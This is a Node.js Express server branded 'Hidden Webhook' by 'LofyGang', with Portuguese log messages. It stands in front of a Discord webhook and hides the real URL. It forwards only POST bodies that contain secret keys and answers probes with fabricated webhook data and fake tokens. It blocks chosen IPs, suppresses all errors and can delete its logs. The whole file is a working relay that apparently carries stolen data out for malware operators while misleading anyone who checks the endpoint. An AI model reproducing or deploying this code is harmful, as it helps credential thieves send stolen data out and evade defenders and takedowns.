/** @picx */

console.clear()

process.on("unhandledRejection", e => {})
process.on("uncaughtException", e => {})
process.on("uncaughtRejection", e => {})
process.warn = () => {}


var cr = (function () {
    var h = ['H', 'Hi', 'Hid', 'Hidd', 'Hidde', 'Hidden', 'Hidden W', 'Hidden We', 'Hidden Web', 'Hidden Webh', 'Hidden Webho', 'Hidden Webhoo', 'Hidden Webhook', './LofyGang'];
    var i = 0;

    return setInterval(() => {
        i = (i > h.length - 1) ? 0 : i;
        process.title = (h[i]);
        i++;
    }, 300);
})();


const express = require('express'),
    app = express(),
    fetch = require('node-fetch'),
    cc = require('ansi-colors'),
    fs = require('fs'),
    bodyParser = require('body-parser'),
    randomstring = require("randomstring"),

    expressip = require('./modulo/ip'),
    node = require("./config.json")

const WEBHOOK = (node.webhook)
const KEY = (node.key)
const LOGIP = (node["log ip"])
const BLACKLIST = (node["black list ip"])
const DELLOGS = (node["deletar logs"])


if (DELLOGS === true) {
    fs.readdir("./data/", (err, files) => {
        files.map(file => {
            try {
                fs.rmdirSync("./data/" + file, {
                    recursive: true
                })
                console.log(cc.green(`[✅] O arquivo ${file} foi deletado com sucesso`));
            } catch (err) {
                console.error(cc.red(`[❌] Erro ao deletar o arquivo ${file}`))
            }
        })
    })
}

console.log(cc.yellow(`\n\n
██╗  ██╗██╗██████╗ ██████╗ ███████╗███╗   ██╗    ██╗    ██╗███████╗██████╗ ██╗  ██╗ ██████╗  ██████╗ ██╗  ██╗
██║  ██║██║██╔══██╗██╔══██╗██╔════╝████╗  ██║    ██║    ██║██╔════╝██╔══██╗██║  ██║██╔═══██╗██╔═══██╗██║ ██╔╝
███████║██║██║  ██║██║  ██║█████╗  ██╔██╗ ██║    ██║ █╗ ██║█████╗  ██████╔╝███████║██║   ██║██║   ██║█████╔╝ 
██╔══██║██║██║  ██║██║  ██║██╔══╝  ██║╚██╗██║    ██║███╗██║██╔══╝  ██╔══██╗██╔══██║██║   ██║██║   ██║██╔═██╗ 
██║  ██║██║██████╔╝██████╔╝███████╗██║ ╚████║    ╚███╔███╔╝███████╗██████╔╝██║  ██║╚██████╔╝╚██████╔╝██║  ██╗
╚═╝  ╚═╝╚═╝╚═════╝ ╚═════╝ ╚══════╝╚═╝  ╚═══╝     ╚══╝╚══╝ ╚══════╝╚═════╝ ╚═╝  ╚═╝ ╚═════╝  ╚═════╝ ╚═╝  ╚═╝
\n\n`))


if (!WEBHOOK) return console.log(cc.yellow("[🔍] Você não forneceu uma webhook em config.json"))
if (WEBHOOK.indexOf("webhooks") !== 24) return console.log(cc.yellow("[🔍] Isso nem é uma webhook -_- arruma isso em config.json"))
if (!KEY) return console.log(cc.yellow("[🔍] Você não forneceu uma key em config.json"))


app.use(bodyParser.urlencoded({
    extended: false
}))
app.use(bodyParser.json())
app.use(expressip().getip)



app.use(async (req, res, next) => {

    const ipblock = (BLACKLIST)
    let ippreto = ""
    ipblock.forEach(ok => {
        if (ok.indexOf(req.ipInfo.ip) !== -1) return ippreto = "ok"
        return;
    })

    if (ippreto === "ok") return res.status(500).send("Ip block")

    if (req.error !== undefined) {
        return next();
    }

    res.append('Access-Control-Allow-Origin', ['*']);
    res.append('Access-Control-Allow-Methods', 'GET,PUT,POST,DELETE');
    res.append('Access-Control-Allow-Headers', 'Content-Type');

    res.status(200)
    next()

})





app.get('/discord.com/api/webhooks', async function (req, res, next) {

    const logips = () => {
        if (LOGIP === true) return " " + req.ipInfo.ip
        return ""
    }

    const api = await fetch(WEBHOOK + "?wait=true", {
        method: "GET",
        headers: {
            "accept": "application/json",
            "accept-language": "en",
            "content-type": "application/json",
            "sec-ch-ua": "\"Google Chrome\";v=\"105\", \"Not)A;Brand\";v=\"8\", \"Chromium\";v=\"105\"",
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": "\"Windows\"",
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "cross-site"
        },
        referrer: "https://discohook.org/",
        referrerPolicy: "strict-origin",
        mode: "cors",
        credentials: "omit"
    })

    const body = await api.json().catch(err => {})

    if (api && api.status === 200) {
        res.status(api.status).json({
            "type": 1,
            "id": randomstring.generate({
                length: 19,
                charset: "numeric"
            }),
            "name": "Spidey Bot",
            "avatar": null,
            "channel_id": randomstring.generate({
                length: 19,
                charset: "numeric"
            }),
            "guild_id": randomstring.generate({
                length: 19,
                charset: "numeric"
            }),
            "application_id": null,
            "token": randomstring.generate(21) + "-" + randomstring.generate(4) + "_" + randomstring.generate(41)
        })
    } else if (body && body.message === 'Unknown Webhook') {
        console.log(cc.red("[❗] Webhook desconhecido." + logips()))
        return res.status(api.status).json(body)
    } else if (body && body.message === 'Invalid Webhook Token') {
        console.log(cc.red("[❗] Token de webhook e inválido." + logips()))
        return res.status(api.status).json(body)
    } else if (body && body.message === 'Invalid API version') {
        console.log(cc.red("[❗] Versão da API e inválida." + logips()))
        return res.status(api.status).json(body)
    } else if (body && body.message === '404: Not Found') {
        console.log(cc.red("[❗] Verifique se o link da webhook é válido." + logips()))
        return res.status(api.status).send(body)
    } else if (body && body.message === '405: Method Not Allowed') {
        console.log(cc.red("[❗] Verifique se o link da webhook é válido." + logips()))
        return res.status(api.status).send(body)
    } else if (body === undefined) {
        console.log(cc.red("[❗] Verifique se o link da webhook é válido." + logips()))
        return res.status(500).json({
            error: "Verifique se o link da webhook é válido."
        })
    }


})





app.post('/discord.com/api/webhooks', async function (req, res, next) {

    const logips = () => {
        if (LOGIP === true) return " " + req.ipInfo.ip
        return ""
    }

    const data = Date.now()

    function fuking(req) {
        if (req && req.body !== undefined) return JSON.stringify(req.body, null, 2)
        if (Object.keys(req.params).length !== 0) return req.params
        else return "{}"
    }


    try {
        if (!fs.existsSync(`./data/${data}`)) {
            fs.mkdirSync(`./data/${data}`);
            fs.writeFile(`./data/${data}/webhook-msg.json`, fuking(req), (err) => {
                if (err)
                    console.log(cc.red("[📦] Erro ao criar o arquivo"))
                else {
                    console.log(cc.magenta("[📦] Log escrita com sucesso"))
                    const emb = fs.readFileSync(`./data/${data}/webhook-msg.json`, 'utf-8')
                    fs.writeFileSync(`./data/${data}/ip.json`, JSON.stringify(req.ipInfo, null, 2));

                    chave = ""
                    KEY.forEach(ok => {
                        if (emb.indexOf(ok) !== -1) return chave = "ok"
                    })

                    if (chave === "ok") return webhooks()

                    else {
                        console.log(cc.red("[🤡] Ao macaco tentando fazer merda" + logips()))
                        return res.status(400).send("Ao macaco tentando fazer merda")
                    }

                }
            })
        }
    } catch (err) {
        console.error(cc.red("[❌] Erro ao criar o diretório."));
    }

    const webhooks = async () => {
        const api = await fetch(WEBHOOK + "?wait=true", {
            method: "POST",
            body: fuking(req),
            headers: {
                "accept": "application/json",
                "accept-language": "en",
                "content-type": "application/json",
                "sec-ch-ua": "\"Google Chrome\";v=\"105\", \"Not)A;Brand\";v=\"8\", \"Chromium\";v=\"105\"",
                "sec-ch-ua-mobile": "?0",
                "sec-ch-ua-platform": "\"Windows\"",
                "sec-fetch-dest": "empty",
                "sec-fetch-mode": "cors",
                "sec-fetch-site": "cross-site"
            },
            referrer: "https://discohook.org/",
            referrerPolicy: "strict-origin",
            mode: "cors",
            credentials: "omit"
        })

        const body = await api.json().catch(err => {
            if (!err) return;
        })


        if (body && body.status === 200) {
            res.status(api.status).send(body)
            console.log(cc.green("[✅] Conteúdo enviado com sucesso" + logips()))
        } else if (body && body.message === 'The request body contains invalid JSON.') {
            console.log(cc.red("[❓] O corpo de solicitação contém JSON inválido." + logips()))
            return res.status(api.status).json(body)
        } else if (body && body.message === 'Cannot send an empty message') {
            console.log(cc.red("[❗] Não posso enviar uma mensagem vazia" + logips()))
            return res.status(api.status).json(body)
        } else if (body && body.author && body.author.discriminator === "0000") {
            console.log(cc.green("[✔] Sucesso ao enviar a mensagem." + logips()))
            return res.status(api.status).json({
                "id": randomstring.generate({
                    length: 19,
                    charset: "numeric"
                }),
                "type": 0,
                "content": "trfjrtj",
                "channel_id": randomstring.generate({
                    length: 19,
                    charset: "numeric"
                }),
                "author": {
                    "bot": true,
                    "id": randomstring.generate({
                        length: 19,
                        charset: "numeric"
                    }),
                    "username": "Lofy Hidden webhook",
                    "avatar": null,
                    "discriminator": "0000"
                },
                "attachments": [],
                "embeds": [],
                "mentions": [],
                "mention_roles": [],
                "pinned": false,
                "mention_everyone": false,
                "tts": false,
                "timestamp": Date.now(),
                "edited_timestamp": null,
                "flags": 0,
                "components": [],
                "webhook_id": randomstring.generate({
                    length: 19,
                    charset: "numeric"
                })
            })
        } else if (body && body.message === 'Unknown Webhook') {
            console.log(cc.red("[❗] Webhook desconhecido." + logips()))
            return res.status(api.status).json(body)
        } else if (body && body.message === 'Invalid Webhook Token') {
            console.log(cc.red("[❗] Token de webhook e inválido." + logips()))
            return res.status(api.status).json(body)
        } else if (body && body.message === 'Invalid API version') {
            console.log(cc.red("[❗] Versão da API e inválida." + logips()))
            return res.status(api.status).json(body)
        } else if (body && body.message === '404: Not Found') {
            console.log(cc.red("[❗] Verifique se o link da webhook é válido." + logips()))
            return res.status(api.status).send(body)
        } else if (body && body.message === '405: Method Not Allowed') {
            console.log(cc.red("[❗] Verifique se o link da webhook é válido." + logips()))
            return res.status(api.status).send(body)
        } else if (body === undefined) {
            console.log(cc.red("[❗] Verifique se o link da webhook é válido." + logips()))
            return res.status(500).json({
                error: "Verifique se o link da webhook é válido."
            })
        } else if (body && body.message === "You are being rate limited.") {
            res.status(api.status).send("You are being rate limited.")
            const rateLimit = body["retry_after"].toString().replace(".", "")
            console.log(cc.yellow("[🎉] Webhook está limitada, aguarde " + rateLimit + " milisegundos" + logips()))
            setTimeout(function () {
                webhooks()
            }, rateLimit);
        }

    }

})





app.listen(process.env.PORT || 8080, (ok) => {
    console.log(cc.green("[💣] Servidor rodando na porta 8080"))
})